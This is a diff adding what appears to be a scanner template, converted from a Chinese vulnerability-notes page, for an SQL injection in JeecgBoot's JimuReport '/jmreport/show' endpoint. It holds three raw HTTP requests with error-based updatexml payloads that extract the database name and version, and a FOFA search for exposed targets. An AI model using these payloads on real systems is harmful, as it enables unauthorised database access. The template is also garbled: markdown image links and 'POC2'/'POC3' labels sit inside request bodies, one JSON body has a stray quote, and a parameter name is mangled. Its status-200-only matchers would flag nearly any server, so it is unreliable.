@@ -1,0 +1,87 @@
+id: poc-oama3l46ln8711m7
+info:
+  name: JeecgBoot 积木报表 show 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/oama3l46ln8711m7'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: oama3l46ln8711m7
+    fofa: app="JeecgBoot-企业级低代码平台" || body="jeecg-boot"
+http:
+- raw:
+  - 'POST /jeecg-boot/jmreport/show HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: keep-alive
+
+    Content-Type: application/json
+
+    Content-Length: 129
+
+
+    {"id":"961455b47c0b86dc961e90b5893bff05","apiUrl":"","params":"{\"id\":\"1''and(updatexml(0x3e,concat(1,(database())),1))=''\"}"}![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1763892783617-17080700-0841-4f9b-bf7a-8c513eee7801.png)
+
+    **POC2:**'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /jmreport/show HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36
+
+    Connection: keep-alive
+
+    Content-Length: 128
+
+    Content-Type: application/json;charset=UTF-8
+
+    Accept-Encoding: gzip, deflate, br
+
+
+    {"id":"961455b47c0b86dc961e90b5893bff05","apiUrl":"","params":"{\"id\":\""1''and(updatexml(0x3e,concat(1,(database())),1))=''\"}"}
+
+    **POC3:**'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /jeecg-boot/jmreport/show?apiUrl&id=961455b47c0b86dc961e90b5893bff05¶ms=%7b%22id%22%3a%221%27and%28updatexml%280x3a%2cconcat%281%2c%28version%28%29%29%29%2c1%29%29%3d%27%22%7d HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: keep-alive![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1763892783837-55e00d61-ac43-4939-8b60-9a4bffb6af19.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
